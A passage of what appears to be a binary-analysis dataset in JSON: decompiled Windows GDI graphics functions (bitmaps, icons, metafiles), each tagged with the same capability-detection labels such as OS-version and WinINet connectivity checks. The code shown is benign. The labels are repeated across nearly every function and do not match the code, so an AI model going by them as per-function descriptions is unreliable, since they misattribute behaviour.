        "decompiled_code": "\nvoid __cdecl fcn.00425ab4(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint *in_EDX;\n    uint *in_FS_OFFSET;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    int32_t iStack76;\n    uint uStack68;\n    int32_t iStack64;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint lpbInit;\n    uint hdc;\n    uint var_ch;\n    uint var_8h;\n    uint lpbmih;\n    \n    *(in_EAX + 8) = *(in_EAX + 8) >> 1;\n    uStack40 = 0x425ae2;\n    iVar1 = fcn.00425454();\n    *(in_EAX + 0x14) = iVar1 * *(in_EAX + 8);\n    uStack40 = 0x425afa;\n    iVar1 = fcn.00425434();\n    uStack40 = 0;\n    puStack44 = 0x425b03;\n    iStack76 = sub.user32.dll_GetDC();\n    if (iStack76 == 0) {\n        puStack44 = 0x425b11;\n        fcn.004251c8();\n    }\n    uStack48 = 0x425c61;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    iStack64 = in_EAX + 0x28 + iVar1 * 4;\n    uStack56 = 0;\n    uStack68 = 4;\n    puStack80 = 0x425b4b;\n    puStack44 = &stack0xfffffffc;\n    sub.gdi32.dll_CreateDIBitmap();\n    puStack80 = 0x425b50;\n    uVar2 = fcn.004252c4();\n    uStack84 = 0x425b87;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    puStack80 = &stack0xfffffffc;\n    uVar3 = fcn.004252d4();\n    *in_EDX = uVar3;\n    *in_FS_OFFSET = uStack88;\n    puStack80 = 0x425b8e;\n    uStack88 = 0x425b86;\n    uStack84 = uVar2;\n    sub.gdi32.dll_DeleteObject();\n    return;\n}\n",
        "token_count": 573
    },
    "00425d10": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00425d10(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t iVar3;\n    int32_t iStack156;\n    uint uStack152;\n    uchar *puStack148;\n    uint uStack144;\n    int32_t iStack140;\n    uint uStack136;\n    uchar *puStack132;\n    uint hdc;\n    uint var_1ch;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack132 = 0x425d36;\n    fcn.00402ed8();\n    uStack136 = 0x426009;\n    iStack140 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff74;\n    uStack144 = 0x425d55;\n    puStack132 = &stack0xfffffffc;\n    (**(*in_EAX + 0xc))();\n    if ((*arg_ch | arg_ch[1]) == 0) {\n        uStack144 = 0xb;\n        puStack148 = 0x425d63;\n        uVar1 = sub.user32.dll_GetSystemMetrics();\n        *arg_8h = uVar1;\n        puStack148 = 0xc;\n        uStack152 = 0x425d6f;\n        uVar1 = sub.user32.dll_GetSystemMetrics();\n        arg_8h[1] = uVar1;\n    }\n    else {\n        *arg_8h = *arg_ch;\n        arg_8h[1] = arg_ch[1];\n    }\n    uStack144 = 0;\n    puStack148 = 0x425d8b;\n    iVar2 = sub.user32.dll_GetDC();\n    if (iVar2 == 0) {\n        puStack148 = 0x425d99;\n        fcn.004251c8();\n    }\n    uStack152 = 0x425df9;\n    iStack156 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff64;\n    puStack148 = &stack0xfffffffc;\n    sub.gdi32.dll_GetDeviceCaps(iVar2, 0xe);\n    iVar3 = iVar2;\n    sub.gdi32.dll_GetDeviceCaps(iVar2, 0xc);\n    *in_FS_OFFSET = iVar3;\n    sub.user32.dll_ReleaseDC(0, iVar2, 0x425e00);\n    return;\n}\n",
        "token_count": 575
    },
    "00426034": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00426034(uint32_t param_1, uint32_t *param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    uint32_t *puVar4;\n    uchar auStack96 [4];\n    int16_t iStack92;\n    int16_t iStack90;\n    uint32_t auStack84 [18];\n    \n    auStack84[3] = 0;\n    iVar1 = sub.gdi32.dll_GetObjectA();\n    if (iVar1 == 0) {\n        fcn.004251a4();\n    }\n    else if ((iVar1 < 0x40) || (auStack84[0] < 0x28)) {\n        fcn.00403aac();\n        *param_2 = 0x28;\n        param_2[1] = 0x54;\n        param_2[2] = auStack96;\n    }\n    else {\n        puVar3 = auStack84;\n        puVar4 = param_2;\n        for (iVar1 = 10; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar4 = *puVar3;\n            puVar3 = puVar3 + 1;\n            puVar4 = puVar4 + 1;\n        }\n    }\n    if (param_1 == 2) {\n        *(param_2 + 0xe) = 1;\n    }\n    else if (param_1 - 3 < 0xe) {\n        *(param_2 + 0xe) = 4;\n        param_2[8] = param_1;\n    }\n    else if (param_1 - 0x11 < 0xf0) {\n        *(param_2 + 0xe) = 8;\n        param_2[8] = param_1;\n    }\n    else {\n        *(param_2 + 0xe) = iStack90 * iStack92;\n    }\n    *(param_2 + 3) = 1;\n    if (param_2[8] < param_2[9]) {\n        param_2[9] = param_2[8];\n    }\n    if (param_2[5] == 0) {\n        iVar1 = fcn.00425454();\n        uVar2 = param_2[2] >> 0x1f;\n        param_2[5] = iVar1 * ((param_2[2] ^ uVar2) - uVar2);\n    }\n    return;\n}\n",
        "token_count": 562
    },
    "00426188": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00426188(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uVar4;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint hdc;\n    int32_t hpal;\n    uint var_1h;\n    \n    uStack32 = 0x4261a3;\n    fcn.00426034();\n    hpal = 0;\n    uStack32 = 0;\n    puStack36 = 0x4261af;\n    uVar1 = sub.gdi32.dll_CreateCompatibleDC();\n    uStack40 = 0x426225;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &fcn.00426188::var_1h + 1;\n    if (in_EDX != 0) {\n        puStack36 = &fcn.00426188::var_1h + 1;\n        hpal = sub.gdi32.dll_SelectPalette(uVar1);\n        sub.gdi32.dll_RealizePalette(uVar1);\n    }\n    uVar4 = *(in_ECX + 8);\n    uVar3 = uVar1;\n    iVar2 = sub.gdi32.dll_GetDIBits();\n    var_1h._0_1_ = iVar2 != 0;\n    *in_FS_OFFSET = uVar3;\n    if (hpal != 0) {\n        sub.gdi32.dll_SelectPalette(uVar1, hpal, 0, 0x42622c, uVar4, arg_ch);\n    }\n    sub.gdi32.dll_DeleteDC(uVar1);\n    return;\n}\n",
        "token_count": 439
    },
    "00426260": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00426260(uint param_1, uint param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack140;\n    uint uStack136;\n    uchar *puStack132;\n    uint uStack120;\n    uint uStack116;\n    uchar *puStack112;\n    uint uStack108;\n    uint *puStack104;\n    uint var_54h;\n    uint var_4ch;\n    uint var_48h;\n    uint piconinfo;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ah;\n    ushort var_26h;\n    uint var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack104 = 0x42627f;\n    fcn.00403aac();\n    puStack104 = 0x42628e;\n    fcn.00403aac();\n    puStack104 = &fcn.00426260::piconinfo;\n    puStack112 = 0x426298;\n    uStack108 = param_2;\n    sub.user32.dll_GetIconInfo();\n    puStack112 = 0x42629d;\n    fcn.00426254();\n    uStack116 = 0x426450;\n    uStack120 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff88;\n    puStack112 = &fcn.00426260::var_1h + 1;\n    fcn.00426118(2);\n    puStack132 = 0x4262cb;\n    fcn.00426118(0xffffffff);\n    var_18h = 0;\n    var_1ch = 0;\n    var_20h = 0;\n    var_24h = 0;\n    uStack136 = 0x426429;\n    uStack140 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff74;\n    puStack132 = &fcn.00426260::var_1h + 1;\n    var_18h = fcn.00402ed8();\n    var_1ch = fcn.00402ed8();\n    var_20h = fcn.00402ed8();\n    var_24h = fcn.00402ed8();\n    fcn.00426188(2, var_1ch);\n    uVar3 = 0xffffffff;\n    fcn.00426188(0xffffffff, var_24h);\n    if (var_1h != '\\0') {\n        var_30h = var_ch + 0x16 + var_14h + var_10h;\n        (**(*in_EAX + 0x10))();\n    }\n    var_2ah._2_2_ = 1;\n    var_26h = 1;\n    (**(*in_EAX + 0x10))();\n    iVar2 = var_20h;\n    (**(*in_EAX + 0x10))();\n    piVar1 = iVar2 + 8;\n    *piVar1 = *piVar1 + *(iVar2 + 8);\n    (**(*in_EAX + 0x10))();\n    (**(*in_EAX + 0x10))();\n    (**(*in_EAX + 0x10))();\n    *in_FS_OFFSET = uVar3;\n    fcn.00402f0c(0x426430);\n    fcn.00402f0c();\n    fcn.00402f0c();\n    fcn.00402f0c();\n    return;\n}\n",
        "token_count": 882
    },
    "00426498": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00426498(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x20) = 1;\n    if (*(in_EAX + 0x12) != 0) {\n        (**(in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 71
    },
    "004264b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004264b0(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    \n    if (*(*(arg_8h + -4) + 0x20) == 0) {\n        uVar2 = (**(**(arg_8h + -8) + 0x1c))();\n        return uVar2 ^ 1;\n    }\n    cVar1 = fcn.004047cc();\n    if ((cVar1 != '\\0') && (cVar1 = (**(**(arg_8h + -8) + 0x18))(),  cVar1 != '\\0')) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 163
    },
    "00426554": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.00426554(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint32_t uVar6;\n    uint *in_FS_OFFSET;\n    ulong uVar7;\n    ulong uVar8;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    if (param_2 == NULL) {\ncode_r0x00426579:\n        var_1h._0_1_ = 0;\n    }\n    else {\n        puStack32 = 0x42656c;\n        iVar2 = fcn.00404518();\n        puStack32 = 0x426575;\n        iVar3 = fcn.00404518();\n        if (iVar2 != iVar3) goto code_r0x00426579;\n        var_1h._0_1_ = 1;\n    }\n    puStack32 = 0x426589;\n    cVar1 = (**(*in_EAX + 0x1c))();\n    if (cVar1 == '\\0') {\n        puStack32 = 0x426594;\n        cVar1 = (**(*param_2 + 0x1c))();\n        if (cVar1 == '\\0') {\n            if (var_1h != 0) {\n                puStack32 = 0x4265d2;\n                puVar4 = fcn.00404610();\n                uStack36 = 0x42668b;\n                uStack40 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd8;\n                puStack44 = 0x4265ed;\n                puStack32 = &fcn.00426554::var_1h + 1;\n                (**(*in_EAX + 0x44))();\n                puStack44 = 0x4265f9;\n                puVar5 = fcn.00404610();\n                uStack48 = 0x42666e;\n                uStack52 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffcc;\n                puStack44 = &fcn.00426554::var_1h + 1;\n                (**(*param_2 + 0x44))();\n                uVar7 = (***puVar4)();\n                uVar8 = (***puVar5)();\n                if (uVar8 >> 0x20 == uVar7 >> 0x20 && uVar8 == uVar7) {\n                    (***puVar4)();\n                    cVar1 = fcn.004098cc();\n                    if (cVar1 != '\\0') {\n                        var_1h._0_1_ = 1;\n                        goto code_r0x00426655;\n                    }\n                }\n                var_1h._0_1_ = 0;\ncode_r0x00426655:\n                *in_FS_OFFSET = uStack52;\n                puStack44 = 0x426675;\n                uStack48 = 0x42666d;\n                uVar6 = fcn.00404640();\n                return uVar6;\n            }\n            goto code_r0x00426692;\n        }\n    }\n    puStack32 = 0x42659f;\n    cVar1 = (**(*in_EAX + 0x1c))();\n    if (cVar1 != '\\0') {\n        puStack32 = 0x4265aa;\n        cVar1 = (**(*param_2 + 0x1c))();\n        if (cVar1 != '\\0') {\n            var_1h._0_1_ = 1;\n            goto code_r0x00426692;\n        }\n    }\n    var_1h._0_1_ = 0;\ncode_r0x00426692:\n    return var_1h;\n}\n",
        "token_count": 924
    },
    "00426700": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00426700(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x1a) != 0) {\n        (**(in_EAX + 0x18))(arg_8h, arg_ch, arg_10h, arg_14h);\n    }\n    return;\n}\n",
        "token_count": 96
    },
    "004267cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004267cc(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uchar uVar2;\n    uint uStack292;\n    uint uStack288;\n    uchar *puStack284;\n    uint var_108h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack284 = &stack0xfffffffc;\n    uStack288 = 0x42684a;\n    uStack292 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffedc;\n    iVar1 = *(in_EAX + 8) + -1;\n    uVar2 = iVar1 == 0;\n    if (-1 < iVar1) {\n        do {\n            fcn.004197d8();\n            fcn.00404520();\n            fcn.004056d0();\n            fcn.00405894();\n            if (uVar2) break;\n            iVar1 = iVar1 + -1;\n            uVar2 = iVar1 == -1;\n        } while (!uVar2);\n    }\n    *in_FS_OFFSET = uStack292;\n    puStack284 = 0x426851;\n    uStack288 = 0x426849;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 284
    },
    "004269d0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004269d0(uint param_1, int16_t param_2)\n\n{\n    int16_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    \n    iVar3 = *(*(in_EAX + 8) + 8) + -1;\n    if (-1 < iVar3) {\n        do {\n            iVar1 = fcn.004197d8();\n            if (param_2 == iVar1) {\n                uVar2 = fcn.004197d8();\n                return uVar2;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != -1);\n    }\n    return 0;\n}\n",
        "token_count": 158
    },
    "00426a0c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00426a0c(void)\n\n{\n    if (*0x490e1c == 0) {\n        *0x490e1c = fcn.004268bc();\n    }\n    return *0x490e1c;\n}\n",
        "token_count": 58
    },
    "00426d74": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00426d74(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x22) != 0) {\n        (**(in_EAX + 0x20))(arg_8h, arg_ch, arg_10h, arg_14h);\n    }\n    return;\n}\n",
        "token_count": 96
    },
    "00426da0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00426da0(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack112;\n    uint uStack108;\n    int32_t *piStack104;\n    uint uStack100;\n    uint uStack96;\n    uchar *puStack92;\n    uint var_48h;\n    uint var_44h;\n    int32_t *var_4h;\n    \n    puStack92 = &stack0xfffffffc;\n    uStack96 = 0x426ea6;\n    uStack100 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff9c;\n    piStack104 = 0x426dcf;\n    (**(*param_2 + 0xc))();\n    piStack104 = 0x426ddd;\n    (**(*param_2 + 0xc))();\n    piStack104 = 0x426de8;\n    fcn.004056d0();\n    piStack104 = 0x426df5;\n    iVar1 = fcn.004267cc();\n    var_4h = NULL;\n    if (iVar1 != 0) {\n        piStack104 = 0x426e03;\n        var_4h = (**(iVar1 + 0x48))();\n        uStack108 = 0x426e28;\n        uStack112 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff90;\n        piStack104 = &stack0xfffffffc;\n        (**(*var_4h + 0x30))();\n        *in_FS_OFFSET = uStack112;\n    }\n    piStack104 = 0x426e47;\n    fcn.00404640();\n    *(in_EAX + 0xc) = var_4h;\n    if (var_4h != NULL) {\n        var_4h[5] = in_EAX;\n        piStack104 = var_4h;\n        uStack108 = 0x426e65;\n        iVar1 = fcn.00404854();\n        piStack104[4] = iVar1;\n        var_4h[7] = in_EAX;\n        piStack104 = var_4h;\n        uStack108 = 0x426e7d;\n        iVar1 = fcn.00404854();\n        piStack104[6] = iVar1;\n    }\n    piStack104 = 0x426e90;\n    fcn.0040483c();\n    *in_FS_OFFSET = uStack100;\n    puStack92 = 0x426ead;\n    uStack96 = 0x426ea5;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 598
    },
    "00426f0c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00426f0c(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    char cVar3;\n    bool bVar4;\n    \n    iVar1 = *(*(arg_8h + -4) + 0x20);\n    if (iVar1 == 0) {\n        bVar4 = *(*(arg_8h + -8) + 0xc) != 0;\n    }\n    else {\n        bVar4 = true;\n        cVar3 = fcn.004047cc();\n        if (cVar3 != '\\0') {\n            if ((*(*(arg_8h + -8) + 0xc) == *(iVar1 + 0xc)) ||\n               (((piVar2 = *(*(arg_8h + -8) + 0xc),  piVar2 != NULL && (*(iVar1 + 0xc) != 0)) &&\n                (cVar3 = (**(*piVar2 + 0x18))(),  cVar3 != '\\0')))) {\n                bVar4 = false;\n            }\n            else {\n                bVar4 = true;\n            }\n        }\n    }\n    return bVar4;\n}\n",
        "token_count": 267
    },
    "004274c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004274c4(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int16_t iVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack180;\n    uint uStack176;\n    uchar *puStack172;\n    uint lpemh;\n    uint var_76h;\n    uint var_72h;\n    uint var_32h;\n    uint var_2eh;\n    uint var_2ah;\n    uint var_26h;\n    int32_t var_22h;\n    uint var_1ch;\n    uint nNumber;\n    uint nDenominator;\n    int16_t var_eh;\n    uint lpbBuffer;\n    int32_t cbBuffer;\n    int32_t *var_4h;\n    \n    puStack172 = 0x4274df;\n    var_4h = param_2;\n    fcn.00427360();\n    puStack172 = 0x4274ef;\n    (**(*var_4h + 0xc))();\n    if (var_22h == -0x65393229) {\n        puStack172 = 0x427500;\n        iVar2 = fcn.0042601c();\n        if (iVar2 == var_eh) goto code_r0x0042750b;\n    }\n    puStack172 = 0x42750b;\n    fcn.004251bc();\ncode_r0x0042750b:\n    cbBuffer = cbBuffer + -0x16;\n    puStack172 = 0x427517;\n    lpbBuffer = fcn.00402ef0();\n    iVar1 = *(in_EAX + 0x28);\n    uStack176 = 0x427633;\n    iStack180 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff4c;\n    puStack172 = &stack0xfffffffc;\n    (**(*var_4h + 0xc))();\n    *(*(in_EAX + 0x28) + 0x18) = nDenominator;\n    if (nDenominator == 0) {\n        nDenominator._0_2_ = 0x60;\n    }\n    uVar3 = sub.kernel32.dll_MulDiv(nNumber - var_1ch, 0x9ec, nDenominator);\n    *(iVar1 + 0xc) = uVar3;\n    uVar3 = sub.kernel32.dll_MulDiv(nNumber._2_2_ - var_1ch._2_2_, 0x9ec, nDenominator);\n    *(iVar1 + 0x10) = uVar3;\n    var_32h = 8;\n    var_2eh = 0;\n    var_2ah = 0;\n    var_26h = 0;\n    iVar4 = sub.gdi32.dll_SetWinMetaFileBits(cbBuffer, lpbBuffer, 0, &fcn.004274c4::var_32h);\n    *(iVar1 + 8) = iVar4;\n    if (iVar4 == 0) {\n        fcn.004251bc();\n    }\n    sub.gdi32.dll_GetEnhMetaFileHeader(*(iVar1 + 8), 100, &fcn.004274c4::lpemh);\n    var_32h = 8;\n    var_2eh = var_76h;\n    var_2ah = var_72h;\n    var_26h = 0;\n    sub.gdi32.dll_DeleteEnhMetaFile(*(iVar1 + 8));\n    iVar4 = cbBuffer;\n    iVar5 = sub.gdi32.dll_SetWinMetaFileBits(cbBuffer, lpbBuffer, 0, &fcn.004274c4::var_32h);\n    *(iVar1 + 8) = iVar5;\n    if (iVar5 == 0) {\n        fcn.004251bc();\n    }\n    *(in_EAX + 0x2c) = 0;\n    *in_FS_OFFSET = iVar4;\n    fcn.00402f0c(0x42763a);\n    return;\n}\n",
        "token_count": 932
    },
    "0042779c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042779c(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    if (in_EAX[10] == 0) {\n        fcn.00427360();\n    }\n    iVar1 = in_EAX[10];\n    *(iVar1 + 0x20) = 0;\n    if (param_2 != *(iVar1 + 0x10)) {\n        fcn.004278ec();\n        *(in_EAX[10] + 0x10) = param_2;\n        (**(*in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 152
    },
    "004277d8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004277d8(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    if (in_EAX[10] == 0) {\n        fcn.00427360();\n    }\n    iVar1 = in_EAX[10];\n    *(iVar1 + 0x1c) = 0;\n    if (param_2 != *(iVar1 + 0xc)) {\n        fcn.004278ec();\n        *(in_EAX[10] + 0xc) = param_2;\n        (**(*in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 151
    },
    "004279f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004279f0(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint cbBuffer;\n    uint lpbBuffer;\n    \n    if (*(in_EAX + 0x28) != 0) {\n        uStack24 = 0;\n        uStack28 = 0;\n        uStack32 = *(*(in_EAX + 0x28) + 8);\n        puStack36 = 0x427a10;\n        iVar1 = sub.gdi32.dll_GetEnhMetaFileBits();\n        if (iVar1 != 0) {\n            puStack36 = 0x427a21;\n            uVar2 = fcn.00402ef0();\n            uStack40 = 0x427a6c;\n            uStack44 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffd4;\n            uVar3 = *(*(in_EAX + 0x28) + 8);\n            puStack36 = &stack0xfffffffc;\n            sub.gdi32.dll_GetEnhMetaFileBits(uVar3, iVar1, uVar2);\n            fcn.0041b8b8();\n            *in_FS_OFFSET = uVar3;\n            fcn.00402f0c(0x427a73);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 347
    },
    "00427a7c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
